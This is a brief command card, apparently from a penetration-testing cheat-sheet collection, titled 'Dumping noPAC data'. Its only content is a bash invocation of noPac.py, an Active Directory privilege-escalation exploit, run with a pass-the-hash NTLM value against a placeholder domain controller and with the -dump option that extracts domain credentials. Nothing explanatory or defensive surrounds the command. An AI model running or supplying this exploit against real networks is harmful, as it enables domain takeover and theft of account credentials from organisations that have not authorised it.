---
id: 72d07934-a169-4ef7-a0ae-965ae1b8ba8c
name: Dumping noPAC data
type: command
executor: bash
data: python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0'
  -dc-ip 10.10.10.10 -use-ldap -dump
output: null
created_at: '2023-04-06T03:56:03.186024+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
---

# Dumping noPAC data

```bash
python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
```
